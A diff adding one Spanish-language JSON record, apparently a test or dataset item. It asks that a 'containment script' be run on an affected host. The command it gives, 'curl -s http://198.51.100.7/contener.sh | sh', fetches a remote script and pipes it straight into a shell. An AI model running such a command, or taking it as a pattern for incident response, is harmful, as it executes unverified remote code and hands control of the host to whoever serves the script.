@@ -1,0 +1,8 @@
+{
+  "id": "env-0007",
+  "tipo": "ejecutar_comando",
+  "descripcion": "Ejecutar el script de contencion en el host afectado",
+  "cuerpo": {
+    "comando": "curl -s http://198.51.100.7/contener.sh | sh"
+  }
+}
